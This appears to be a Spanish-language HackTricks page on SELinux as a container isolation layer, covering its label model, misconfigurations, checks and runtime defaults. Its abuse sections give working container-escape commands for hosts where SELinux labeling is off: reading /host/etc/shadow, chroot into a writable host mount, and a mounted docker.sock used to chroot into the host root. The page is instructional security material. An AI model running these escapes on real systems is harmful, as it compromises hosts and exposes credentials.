# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Resumen

SELinux es un sistema de **Control de Acceso Obligatorio basado en etiquetas**. Cada proceso y objeto relevante puede llevar un contexto de seguridad, y la política decide qué dominios pueden interactuar con qué tipos y de qué manera. En entornos containerizados, esto normalmente significa que el runtime lanza el proceso del contenedor bajo un dominio confinado para contenedores y etiqueta el contenido del contenedor con los tipos correspondientes. Si la política funciona correctamente, el proceso podrá leer y escribir lo que su etiqueta debe tocar mientras se le niega acceso a otro contenido del host, incluso si ese contenido se hace visible mediante un montaje.

Esta es una de las protecciones a nivel de host más potentes disponibles en despliegues de contenedores Linux convencionales. Es especialmente importante en Fedora, RHEL, CentOS Stream, OpenShift y otros ecosistemas centrados en SELinux. En esos entornos, un revisor que ignore SELinux a menudo malinterpretará por qué una vía que parece obvia para comprometer el host está realmente bloqueada.

## AppArmor Vs SELinux

La diferencia más sencilla a alto nivel es que AppArmor se basa en rutas mientras que SELinux es **basado en etiquetas**. Eso tiene grandes consecuencias para la seguridad de los contenedores. Una política basada en rutas puede comportarse de manera distinta si el mismo contenido del host se hace visible bajo una ruta de montaje inesperada. Una política basada en etiquetas, en cambio, pregunta cuál es la etiqueta del objeto y qué puede hacerle el dominio del proceso. Esto no hace a SELinux simple, pero sí lo hace robusto frente a una clase de suposiciones sobre trucos de rutas que los defensores a veces cometen accidentalmente en sistemas basados en AppArmor.

Puesto que el modelo está orientado a etiquetas, el manejo de volúmenes de contenedor y las decisiones de re-etiquetado son críticas para la seguridad. Si el runtime u operador cambia las etiquetas demasiado ampliamente para "hacer que los montajes funcionen", el límite de la política que debía contener la carga de trabajo puede volverse mucho más débil de lo previsto.

## Laboratorio

Para ver si SELinux está activo en el host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspeccionar las etiquetas existentes en el host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar una ejecución normal con una en la que el etiquetado está deshabilitado:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
En un host con SELinux habilitado, esto es una demostración muy práctica porque muestra la diferencia entre una carga de trabajo que se ejecuta bajo el dominio de contenedor esperado y otra a la que se le ha quitado esa capa de imposición.

## Uso en tiempo de ejecución

Podman está particularmente bien alineado con SELinux en sistemas donde SELinux forma parte de la configuración predeterminada de la plataforma. Podman sin root junto con SELinux es una de las bases de contenedores más sólidas en el mainstream porque el proceso ya es no privilegiado en el lado del host y además sigue confinado por la política MAC. Docker también puede usar SELinux donde esté soportado, aunque los administradores a veces lo desactivan para sortear fricciones en el etiquetado de volúmenes. CRI-O y OpenShift dependen en gran medida de SELinux como parte de su historia de aislamiento de contenedores. Kubernetes también puede exponer ajustes relacionados con SELinux, pero su valor obviamente depende de si el sistema operativo del nodo realmente soporta e impone SELinux.

La lección recurrente es que SELinux no es un adorno opcional. En los ecosistemas construidos alrededor de él, es parte del límite de seguridad esperado.

## Misconfiguraciones

El error clásico es `label=disable`. Operativamente, esto suele ocurrir porque se negó un montaje de volumen y la respuesta rápida a corto plazo fue eliminar SELinux de la ecuación en lugar de arreglar el modelo de etiquetado. Otro error común es el relabelado incorrecto del contenido del host. Operaciones de relabel amplias pueden hacer que la aplicación funcione, pero también pueden ampliar lo que el contenedor está permitido tocar mucho más allá de lo originalmente previsto.

También es importante no confundir SELinux **instalado** con SELinux **efectivo**. Un host puede soportar SELinux y aún estar en modo permisivo, o el runtime puede no estar lanzando la carga de trabajo bajo el dominio esperado. En esos casos la protección es mucho más débil de lo que la documentación podría sugerir.

## Abuso

Cuando SELinux está ausente, en modo permisivo o ampliamente deshabilitado para la carga de trabajo, las rutas montadas desde el host se vuelven mucho más fáciles de abusar. El mismo bind mount que de otro modo habría estado restringido por etiquetas puede convertirse en una vía directa hacia datos del host o modificación del host. Esto es especialmente relevante cuando se combina con montajes de volúmenes con permiso de escritura, directorios del runtime de contenedores, o atajos operativos que exponen rutas sensibles del host por conveniencia.

SELinux a menudo explica por qué una guía genérica de escape funciona de inmediato en un host pero falla repetidamente en otro aunque los flags del runtime parezcan similares. El ingrediente que falta con frecuencia no es un namespace ni una capability, sino un límite de etiquetas que se mantuvo intacto.

La comprobación práctica más rápida es comparar el contexto activo y luego sondear las rutas montadas del host o los directorios del runtime que normalmente estarían confinados por etiquetas:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si existe un host bind mount y el etiquetado de SELinux ha sido deshabilitado o debilitado, la divulgación de información suele aparecer primero:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si el mount es writable y el container es efectivamente host-root desde el punto de vista del kernel, el siguiente paso es probar una modificación controlada del host en lugar de adivinar:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
En hosts con SELinux habilitado, la pérdida de etiquetas alrededor de los directorios de estado en tiempo de ejecución también puede exponer rutas directas de privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Estos comandos no reemplazan una full escape chain, pero dejan muy claro muy rápidamente si SELinux era lo que impedía el acceso a los datos del host o la modificación de archivos en el host.

### Ejemplo completo: SELinux deshabilitado + montaje de host escribible

Si el etiquetado de SELinux está deshabilitado y el sistema de archivos del host está montado en modo escribible en `/host`, un full host escape se convierte en un caso normal de abuso de bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si el `chroot` tiene éxito, el proceso del contenedor ahora opera desde el sistema de archivos del host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Ejemplo completo: SELinux deshabilitado + Runtime Directory

Si el workload puede alcanzar un runtime socket una vez que las labels están deshabilitadas, el escape puede delegarse al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
La observación relevante es que SELinux a menudo era el control que impedía exactamente este tipo de acceso a host-path o runtime-state.

## Comprobaciones

El objetivo de las comprobaciones de SELinux es confirmar que SELinux está habilitado, identificar el contexto de seguridad actual y comprobar si los archivos o rutas que te interesan están realmente confinados por etiquetas.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Lo interesante aquí:

- `getenforce` debería idealmente devolver `Enforcing`; `Permissive` o `Disabled` cambia el significado de toda la sección de SELinux.
- Si el contexto del proceso actual parece inesperado o demasiado amplio, la carga de trabajo puede no estar ejecutándose bajo la política de contenedor prevista.
- Si los archivos montados desde el host o los directorios de runtime tienen etiquetas a las que el proceso puede acceder con demasiada libertad, los bind mounts se vuelven mucho más peligrosos.

Al revisar un contenedor en una plataforma con capacidad SELinux, no trate el etiquetado como un detalle secundario. En muchos casos es una de las razones principales por las que el host no está ya comprometido.

## Valores por defecto en tiempo de ejecución

| Runtime / platform | Estado por defecto | Comportamiento por defecto | Debilitamientos manuales comunes |
| --- | --- | --- | --- |
| Docker Engine | Dependiente del host | La separación de SELinux está disponible en hosts con SELinux habilitado, pero el comportamiento exacto depende de la configuración del host/daemon | `--security-opt label=disable`, reetiquetado amplio de bind mounts, `--privileged` |
| Podman | Comúnmente habilitado en hosts con SELinux | La separación SELinux es una parte normal de Podman en sistemas con SELinux a menos que esté deshabilitada | `--security-opt label=disable`, `label=false` en `containers.conf`, `--privileged` |
| Kubernetes | No se asigna generalmente automáticamente a nivel de Pod | Existe soporte SELinux, pero los Pods suelen necesitar `securityContext.seLinuxOptions` o valores predeterminados específicos de la plataforma; se requieren soporte de runtime y del nodo | Opciones `seLinuxOptions` débiles o demasiado amplias, ejecución en nodos permissive/disabled, políticas de la plataforma que deshabilitan el etiquetado |
| CRI-O / OpenShift style deployments | Se usan y dependen fuertemente | SELinux suele ser una parte central del modelo de aislamiento de nodos en estos entornos | Políticas personalizadas que amplían excesivamente el acceso, deshabilitar el etiquetado por compatibilidad |

Los valores por defecto de SELinux dependen más de la distribución que los de seccomp. En sistemas estilo Fedora/RHEL/OpenShift, SELinux suele ser central en el modelo de aislamiento. En sistemas sin SELinux, simplemente está ausente.
{{#include ../../../../banners/hacktricks-training.md}}
